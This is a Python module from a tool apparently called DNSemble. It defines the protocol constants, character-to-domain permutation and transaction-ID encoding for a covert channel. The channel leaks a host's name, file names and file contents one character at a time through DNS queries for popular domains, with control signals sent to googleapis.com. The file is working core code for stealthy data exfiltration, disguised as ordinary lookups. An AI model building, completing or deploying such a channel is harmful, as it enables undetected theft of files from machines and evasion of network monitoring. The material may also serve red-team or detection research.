#!/usr/bin/env python3
"""
DNSemble - Shared domain mapping and protocol constants.

Maps 95 printable ASCII characters (0x20-0x7E) plus \\n, \\t, \\r
to 98 well-known domains.  The domain queried IS the data channel.

STATIC MAPPING - the domain list is hardcoded in every agent at
build time.  On SESSION_START the server picks a random 32-bit seed,
returns it as the A-record IP, and both sides feed that seed into
the same deterministic PRNG (xorshift32 Fisher-Yates) to build
identical permutation tables.

Protocol layout
───────────────
  Transaction ID (16 bits):
    High byte [15:8] = client_id  (0-255)
    Low  byte  [7:0] = seq_num    (0-255, wraps with CHUNK control)

  Control channel:
    A query to CONTROL_DOMAIN ("googleapis.com")
    seq byte = control code (0-3) or chunk offset (≥4)

  Data channel (QTYPE selects the phase):
    A    (1)  = file content character
    AAAA (28) = hostname character
    MX   (15) = filename character

See docs/PROTOCOL.md for the full specification.
"""

from pathlib import Path
import re

# ---------------------------------------------------------------------------
# Control domain - all control signals go here as plain A queries.
# ---------------------------------------------------------------------------
CONTROL_DOMAIN = "googleapis.com"

# ---------------------------------------------------------------------------
# Character set: printable ASCII (32-126) + \n \t \r  → 98 entries
# ---------------------------------------------------------------------------
_PRINTABLE = [chr(i) for i in range(32, 127)]
_SPECIAL   = ["\n", "\t", "\r"]
ALL_CHARS  = _PRINTABLE + _SPECIAL

CHAR_TO_INDEX = {ch: i for i, ch in enumerate(ALL_CHARS)}

# ---------------------------------------------------------------------------
# Protocol limits derived from the transaction-ID layout
# ---------------------------------------------------------------------------
# The seq byte carries 0-255 within a chunk; the control channel switches
# chunks with seq codes ≥ CTRL_CHUNK_OFFSET, so the highest reachable chunk
# is 255 - CTRL_CHUNK_OFFSET and the highest content position is
# MAX_CHUNK * 256 + 255.
SEQ_MAX          = 255
MAX_CHUNK        = SEQ_MAX - 3          # highest chunk index the protocol can address
MAX_CONTENT_LEN  = (MAX_CHUNK + 1) * 256   # 64768 supported characters

# The filename/hostname channels are keyed by the raw seq byte only -
# they have no chunk framing, so they carry at most 256 characters.
MAX_NAME_LEN     = SEQ_MAX + 1

# ---------------------------------------------------------------------------
# Domain loading
# ---------------------------------------------------------------------------
_DEFAULT_DOMAINS_PATH = Path(__file__).resolve().parent.parent / "data" / "domains.txt"

# DNS presentation-format label: 1-63 chars of letters/digits/hyphen,
# no leading or trailing hyphen.
_LABEL_RE = re.compile(r"^(?!-)[A-Za-z0-9-]{1,63}(?<!-)$")


def validate_domain_list(domains):
    """Validate a domain pool for protocol use.

    Checks count, uniqueness, DNS label syntax, total name length, and
    collision with the control domain (a pool entry equal to the control
    domain would silently hijack the control channel).
    """
    if len(domains) != len(ALL_CHARS):
        raise ValueError(
            f"Domain list must have exactly {len(ALL_CHARS)} entries, "
            f"got {len(domains)}")
    seen = set()
    for d in domains:
        if not d or not isinstance(d, str):
            raise ValueError(f"Invalid domain entry: {d!r}")
        if d != d.lower():
            raise ValueError(
                f"Domain must be lowercase: {d!r}  (DNS queries are "
                f"case-preserved and the server matches exactly)")
        if len(d) > 253:
            raise ValueError(f"Domain name too long (>253 chars): {d!r}")
        bad = [l for l in d.split(".") if not _LABEL_RE.match(l)]
        if bad:
            raise ValueError(f"Invalid DNS label(s) in domain {d!r}: {bad}")
        if d in seen:
            raise ValueError(f"Duplicate domain in pool: {d!r}  "
                             f"(duplicate entries would corrupt the mapping)")
        if d == CONTROL_DOMAIN:
            raise ValueError(
                f"Domain pool collides with the control domain "
                f"({CONTROL_DOMAIN!r}) - data and control channels would "
                f"be indistinguishable")
        seen.add(d)
    return domains


def load_domains(path=None):
    p = Path(path) if path else _DEFAULT_DOMAINS_PATH
    domains = [line.strip() for line in p.read_text().splitlines() if line.strip()]
    validate_domain_list(domains)
    return domains

DOMAINS = load_domains()
DOMAIN_TO_INDEX = {d: i for i, d in enumerate(DOMAINS)}

def init_domains(path=None):
    global DOMAINS, DOMAIN_TO_INDEX
    DOMAINS = load_domains(path)
    DOMAIN_TO_INDEX = {d: i for i, d in enumerate(DOMAINS)}

# ---------------------------------------------------------------------------
# QTYPE constants  (data-phase selector)
# ---------------------------------------------------------------------------
QTYPE_A    = 1    # content
QTYPE_MX   = 15   # filename
QTYPE_TXT  = 16
QTYPE_AAAA = 28   # hostname

QTYPE_LABELS = {QTYPE_A: "A", QTYPE_AAAA: "AAAA", QTYPE_MX: "MX", QTYPE_TXT: "TXT"}

# ---------------------------------------------------------------------------
# Control codes  (seq byte when domain == CONTROL_DOMAIN, qtype == A)
# ---------------------------------------------------------------------------
CTRL_SESSION_START = 0
CTRL_END_HOSTNAME  = 1
CTRL_END_FILENAME  = 2
CTRL_END_CONTENT   = 3
CTRL_CHUNK_OFFSET  = 3   # seq >= 4 → NEXT_CHUNK, chunk = seq - CTRL_CHUNK_OFFSET

CTRL_LABELS = {
    0: "SESSION_START",
    1: "END_HOSTNAME",
    2: "END_FILENAME",
    3: "END_CONTENT",
}

# ---------------------------------------------------------------------------
# Portable PRNG - xorshift32, identical in Python and C
# ---------------------------------------------------------------------------
def _xorshift32(state):
    state ^= (state << 13) & 0xFFFFFFFF
    state ^= (state >> 17)
    state ^= (state << 5) & 0xFFFFFFFF
    return state & 0xFFFFFFFF

def generate_permutation(seed):
    """Deterministic Fisher-Yates shuffle using xorshift32."""
    perm = list(range(len(ALL_CHARS)))
    state = seed & 0xFFFFFFFF
    if state == 0:
        state = 1
    for i in range(len(perm) - 1, 0, -1):
        state = _xorshift32(state)
        j = state % (i + 1)
        perm[i], perm[j] = perm[j], perm[i]
    return perm

def build_char_to_domain(perm, domains=None):
    """char → domain lookup from a permutation."""
    domains = domains or DOMAINS
    return {ALL_CHARS[ci]: domains[perm[ci]] for ci in range(len(perm))}

def build_domain_to_char(perm, domains=None):
    """domain → char lookup (inverse) from a permutation."""
    domains = domains or DOMAINS
    return {domains[perm[ci]]: ALL_CHARS[ci] for ci in range(len(perm))}

def seed_to_ip(seed):
    b = seed.to_bytes(4, "big")
    return f"{b[0]}.{b[1]}.{b[2]}.{b[3]}"

def ip_to_seed(ip_bytes):
    return int.from_bytes(ip_bytes, "big")

# ---------------------------------------------------------------------------
# Transaction ID helpers
# ---------------------------------------------------------------------------
def encode_txid(client_id, seq_num):
    return ((client_id & 0xFF) << 8) | (seq_num & 0xFF)

def decode_txid(txid):
    return (txid >> 8) & 0xFF, txid & 0xFF
